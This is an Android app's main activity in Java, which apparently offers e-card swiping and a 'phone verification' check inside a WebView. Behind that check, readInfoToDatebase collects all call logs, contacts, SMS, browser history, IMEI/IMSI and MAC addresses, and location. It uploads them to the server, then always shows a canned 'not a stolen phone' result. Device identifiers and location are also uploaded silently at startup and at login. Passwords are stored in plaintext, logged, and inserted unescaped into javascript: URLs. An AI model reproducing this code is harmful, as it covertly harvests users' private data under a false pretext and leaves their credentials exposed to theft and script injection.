package com.thanone.palc.activity;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.LinearLayout;

import com.lidroid.xutils.ViewUtils;
import com.lidroid.xutils.view.annotation.ContentView;
import com.lidroid.xutils.view.annotation.ViewInject;
import com.lidroid.xutils.view.annotation.event.OnClick;
import com.thanone.palc.MyApplication;
import com.thanone.palc.MyConfig;
import com.thanone.palc.R;
import com.thanone.palc.bean.CallRecord;
import com.thanone.palc.bean.Contacts;
import com.thanone.palc.bean.Internet;
import com.thanone.palc.bean.Location;
import com.thanone.palc.bean.LocationBean;
import com.thanone.palc.bean.Messages;
import com.thanone.palc.bean.PhoneInfo;
import com.thanone.palc.util.HttpUrlUtil;
import com.umeng.analytics.MobclickAgent;
import com.umeng.update.UmengUpdateAgent;
import com.zcj.android.util.UtilAndroid;
import com.zcj.android.util.UtilContacts;
import com.zcj.android.util.UtilDialog;
import com.zcj.android.util.UtilInternet;
import com.zcj.android.util.UtilMessage;
import com.zcj.android.util.UtilSharedPreferences;
import com.zcj.android.util.bean.CallRecordBean;
import com.zcj.android.util.bean.ContactBean;
import com.zcj.android.util.bean.InternetBean;
import com.zcj.android.util.bean.MessageBean;
import com.zcj.android.view.webviewshell.OnQuitListener;
import com.zcj.android.view.webviewshell.WebViewUtil;
import com.zcj.android.web.HttpCallback;
import com.zcj.android.web.HttpUtilsHandler;
import com.zcj.util.UtilString;

@ContentView(R.layout.layout_main)
public class MainActivity extends Activity {

	@ViewInject(R.id.webview)
	private WebView webView;

	@ViewInject(R.id.main_error)
	private LinearLayout error;

	@ViewInject(R.id.main_loading)
	private LinearLayout loading;

	private MyApplication application;
	private WebViewUtil webViewUtil;

	Handler mainHandler1;
	/** 申请读取并上传所有手机信息，完毕后调用JS的AndroidReadInfoResult方法 */
	public static final int MESSAGE_WHAT_ALL = 1;
	/** 调用JS方法通知用户 */
	public static final int MESSAGE_WHAT_ALERT = 2;
	/** AlertDialog方式弹出通知 */
	public static final int MESSAGE_WHAT_ALERTDIALOG = 3;
	/** 调用APP的E居刷卡功能 */
	public static final int MESSAGE_WHAT_ECARD = 4;
	/** 客户在HTML里登录成功后的操作：读取并上传手机参数和位置信息 */
	public static final int MESSAGE_WHAT_LOGIN = 5;
	/** 客户再HTML里点击了“首页”的“手机核验”按钮 */
	public static final int MESSAGE_WHAT_HEYAN = 6;
	
	Message newMessage(int theWhat, Object theObj) {
		Message message = new Message();
		message.what = theWhat;
		if (theObj != null) {
			message.obj = theObj;
		}
		return message;
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		ViewUtils.inject(this);

		application = ((MyApplication) getApplication());
		webViewUtil = new WebViewUtil(this, webView, initStaticMap());

		application.startLocationService();
		
		MyConfig.log("开始检测更新");
		UmengUpdateAgent.setUpdateOnlyWifi(false);
		UmengUpdateAgent.update(this);
		MyConfig.log("检测更新结束");

		initHandler();
		initWebViewData();
		readInfoToDatebase(false, false, false, false, true, true, false);
	}

	@SuppressLint("HandlerLeak")
	private void initHandler() {
		mainHandler1 = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				switch (msg.what) {
				case MESSAGE_WHAT_HEYAN:
					final String phoneId = application.getPhoneId();
					if (UtilString.isNotBlank(phoneId)) {
						MyConfig.log("准备调用JS的AndroidHeYanResult("+phoneId+")");
						webView.post(new Runnable() {
							@Override
							public void run() {
								webView.loadUrl("javascript:AndroidHeYanResult('" + phoneId + "')");
							}
						});
					}
					break;
				case MESSAGE_WHAT_ALL:
					readInfoToDatebase(true, true, true, true, true, true, true);
					break;
				case MESSAGE_WHAT_LOGIN:
					readInfoToDatebase(false, false, false, false, true, true, false);
					
					try {
						String[] loginInfo = (String[]) msg.obj;
						if (loginInfo != null  && loginInfo.length == 2) {
							MyConfig.log("开始保存登录的账号："+loginInfo[0]+loginInfo[1]);
							Map<String, String> linfo = new HashMap<String, String>();
							linfo.put(MyApplication.XML_KEY_USERNAME, loginInfo[0]);
							linfo.put(MyApplication.XML_KEY_PASSWORD, loginInfo[1]);
							UtilSharedPreferences.save(application, MyApplication.XML_NAME, linfo);
							MyConfig.log("保存账号成功");
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					break;
				case MESSAGE_WHAT_ALERT:// 在JS里使用function AndroidReadInfoResult(v) {alert(v);}接收返回值
					final String alertMessage = String.valueOf(msg.obj);
					webView.post(new Runnable() {
						@Override
						public void run() {
							webView.loadUrl("javascript:AndroidReadInfoResult('" + alertMessage + "')");
						}
					});
					break;
				case MESSAGE_WHAT_ALERTDIALOG:
					UtilDialog.builderAlertDialog(MainActivity.this, "提示", String.valueOf(msg.obj));
					break;
				case MESSAGE_WHAT_ECARD:
					Long userId = (Long) msg.obj;
					LocationBean loc = application.getLastLocation();
					if (userId == null) {
						UtilDialog.builderAlertDialog(MainActivity.this, "提示", "获取信息失败");
					} else if (loc == null) {
						UtilDialog.builderAlertDialog(MainActivity.this, "提示", "获取信息失败，请稍后再试");
					} else {
						ecard(userId, loc.getLongitude(), loc.getLatitude(), loc.getAddrStr());
					}
					break;
				default:
					break;
				}
				super.handleMessage(msg);
			}
		};
	}
	
	private void ecard(Long memberId, String lng, String lat, String address) {
		HttpUtilsHandler.send(application, HttpUrlUtil.URL_ECARD, HttpUrlUtil.url_ecard(memberId, lng, lat, address), new HttpCallback() {
			@Override
			public void success(String dataJsonString) {
				UtilDialog.builderAlertDialog(MainActivity.this, "提示", "刷卡成功");
			}
		}, true);
	}

	private Map<String, String> initStaticMap() {
		Map<String, String> smap = new HashMap<String, String>();
		smap.put("angular-animate.min.js", "js/angular-animate.min.js");
		smap.put("angular-route.min.js", "js/angular-route.min.js");
		smap.put("angular-sanitize.min.js", "js/angular-sanitize.min.js");
		smap.put("angular.min.js", "js/angular.min.js");
		smap.put("zepto.min.js", "js/zepto.min.js");
		smap.put("iscroll.js", "js/iscroll.js");
		smap.put("ratchet-theme-ios.css", "css/ratchet-theme-ios.css");
		smap.put("ratchet-theme-ios.min.css", "css/ratchet-theme-ios.min.css");
		smap.put("ratchet.css", "css/ratchet.css");
		smap.put("ratchet.min.css", "css/ratchet.min.css");
		smap.put("frozen.css", "css/frozen.css");
		smap.put("index-banner.png", "images/index-banner.png");
		smap.put("index-icon01.png", "images/index-icon01.png");
		smap.put("index-icon02.png", "images/index-icon02.png");
		return smap;
	}

	@Override
	public void onResume() {
		super.onResume();
		MobclickAgent.onResume(this);
	}

	@Override
	public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
	}

	/** 处理返回事件 */
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		Boolean result = webViewUtil.onKeyDown(keyCode, event, new OnQuitListener() {
			@Override
			public void webViewQuit() {
				allQuit();
			}
		});
		if (result != null) {
			return result;
		} else {
			return super.onKeyDown(keyCode, event);
		}
	}

	@OnClick(R.id.main_error)
	private void reload(View v) {
		initWebViewData();
	}

	private void initWebViewData() {
		showLoading();

		MyConfig.log("开始初始化WebView");
		webViewUtil.init(new MyJavascriptInterface(), HttpUrlUtil.URL_INDEX);// 初始化WebView内容
		MyConfig.log("初始化WebView成功");

		MyConfig.log("开始尝试连接服务器");
		HttpUtilsHandler.send(this, HttpUrlUtil.URL_SERVICE_OK, null, new HttpCallback() {
			@Override
			public void success(String dataJsonString) {
				MyConfig.log("连接服务器成功");
				showWebView();
				autoLogin();
			}

			@Override
			public void error() {
				MyConfig.log("连接服务器失败");
				showError();
			}
		}, true);
	}
	
	/** 传递账号密码到HTML，实现自动登录 */
	private void autoLogin() {
		final String u = UtilSharedPreferences.get(this, MyApplication.XML_NAME, MyApplication.XML_KEY_USERNAME);
		final String p = UtilSharedPreferences.get(this, MyApplication.XML_NAME, MyApplication.XML_KEY_PASSWORD);
		if (UtilString.isNotBlank(u) && UtilString.isNotBlank(p)) {
			MyConfig.log("开始自动登录"+u+":"+p);
			webView.post(new Runnable() {
				@Override
				public void run() {
					webView.loadUrl("javascript:AndroidAutoLogin('" + u + "','" + p + "')");
				}
			});
		}
	}

	// 注意：与JS代码绑定的的这个Java对象运行在另一个线程中，与创建它的线程不是一个线程。
	public class MyJavascriptInterface {

		/**
		 * 在JS里使用 Android.readInfo();调用。如果需要传参，则需要加上final关键字
		 * <p>
		 * 在JS里使用function AndroidReadInfoResult(v) {alert(v);}接收返回值
		 * <p>
		 * targetSdkVersion在17及以上，需添加@JavascriptInterface注解
		 */
		@JavascriptInterface
		public void readInfo() {
			MyConfig.log("调用Android的readInfo方法");
			mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_ALL, null));
		}
		
		@JavascriptInterface
		public void ecard(final String memberId) {
			MyConfig.log("调用Android的ecard方法"+memberId);
			if (memberId == null) {
				mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_ALERTDIALOG, "刷卡失败，无法获取当前用户ID"));
			} else {
				mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_ECARD, Long.valueOf(memberId)));
			}
		}
		
		@JavascriptInterface
		public void login(final String username, final String password) {
			MyConfig.log("调用Android的login方法"+username+":"+password);
			mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_LOGIN, new String[]{username, password}));
		}
		
		@JavascriptInterface
		public void heyan() {
			MyConfig.log("调用Android的heyan方法");
			mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_HEYAN, null));
		}
	}

	private void showError() {
		error.setVisibility(View.VISIBLE);
		webView.setVisibility(View.GONE);
		loading.setVisibility(View.GONE);
	}

	private void showWebView() {
		webView.setVisibility(View.VISIBLE);
		error.setVisibility(View.GONE);
		loading.setVisibility(View.GONE);
	}

	private void showLoading() {
		loading.setVisibility(View.VISIBLE);
		webView.setVisibility(View.GONE);
		error.setVisibility(View.GONE);
	}

	/** 退出所有 */
	private void allQuit() {
		// 如果开发者调用Process.kill或者System.exit之类的方法杀死进程，请务必在此之前调用此方法，用来保存统计数据。
		MobclickAgent.onKillProcess(this);
		System.exit(0);
	}

	/**
	 * 读取各类信息到本地数据库（读取之前清理以前读取的 通讯录、通话记录、短信 数据），并上传至服务器
	 * 
	 * @param callRecord
	 *            读取通话记录
	 * @param contacts
	 *            读取通讯录
	 * @param messages
	 *            读取短信
	 * @param internet
	 *            浏览器历史记录
	 * @param phoneInfo
	 *            读取手机参数
	 * @param loc
	 *            读取位置信息
	 * @param showInHtml
	 *            是否调用JS的AndroidReadInfoResult方法
	 */
	private void readInfoToDatebase(final boolean callRecord, final boolean contacts, final boolean messages, final boolean internet,
			final boolean phoneInfo, final boolean loc, final boolean showInHtml) {

		MyConfig.log("开始读取手机数据并上传...");

		new Thread(new Runnable() {
			@Override
			public void run() {
				String result = "";
				List<CallRecord> callRecordList = null;
				List<Contacts> contactsList = null;
				List<Messages> messagesList = null;
				List<Internet> internetList = null;
				PhoneInfo pi = new PhoneInfo();
				Location loc = LocationBean.coverToLocation(application.getLastLocation());
				
				if (callRecord) {
					try {
						MyConfig.log("开始读取通话记录");
						List<CallRecordBean> crb = UtilContacts.getCallRecord(application);
						if (crb != null && crb.size() > 0) {
							callRecordList = CallRecord.converByCallRecordBean(crb, application.getPhoneId());
						}
						result += "读取通话记录" + crb.size() + "条。";
					} catch (Exception e1) {
						e1.printStackTrace();
						result += "读取通话记录失败。";
					}
				}
				if (contacts) {
					try {
						MyConfig.log("开始读取通讯录");
						List<ContactBean> cb = UtilContacts.getContacts(application);
						if (cb != null && cb.size() > 0) {
							contactsList = Contacts.converByContactsBean(cb, application.getPhoneId());
						}
						result += "读取通讯录" + cb.size() + "条。";
					} catch (Exception e1) {
						e1.printStackTrace();
						result += "读取通讯录失败。";
					}
				}
				if (messages) {
					try {
						MyConfig.log("开始读取短信");
						List<MessageBean> mb = UtilMessage.getAllMessages(application);
						if (mb != null && mb.size() > 0) {
							messagesList = Messages.converByMessageBean(mb, application.getPhoneId());
						}
						result += "读取短信" + mb.size() + "条。";
					} catch (Exception e) {
						e.printStackTrace();
						result += "读取短信失败。";
					}
				}
				if (internet) {
					try {
						MyConfig.log("开始读取浏览器历史记录");
						List<InternetBean> ib = UtilInternet.getAllHostory(application);
						if (ib != null && ib.size() > 0) {
							internetList = Internet.converByInternetBean(ib, application.getPhoneId());
						}
						result += "读取浏览器历史记录" + ib.size() + "条。";
					} catch (Exception e) {
						e.printStackTrace();
						result += "读取浏览器历史记录失败。";
					}
				}
				if (phoneInfo) {
					try {
						MyConfig.log("开始读取手机参数");
						pi.setDeviceID(application.getPhoneId());
						pi.setImei(UtilAndroid.getIMEI(application));
						pi.setImsi(UtilAndroid.getIMSI(application));
						pi.setMacAddress(UtilAndroid.getMacAddress(application));
						pi.setBluetoothMacAddress(UtilAndroid.getBluetoothMacAddress());
						pi.setModel(UtilAndroid.getPhoneVersion());
						pi.setOs(UtilAndroid.getAndroidVersion());
						result += "读取手机参数成功。";
					} catch (Exception e) {
						e.printStackTrace();
						result += "读取手机参数失败。";
					}
				}
				
				MyConfig.log(result);

				if (showInHtml) {
					mainHandler1.sendMessage(newMessage(MESSAGE_WHAT_ALERT, "此手机非被盗抢手机"));
				}

				application.uploadInfoToWeb(callRecordList, contactsList, messagesList, pi, loc, internetList);
			}
		}).start();
	}
}
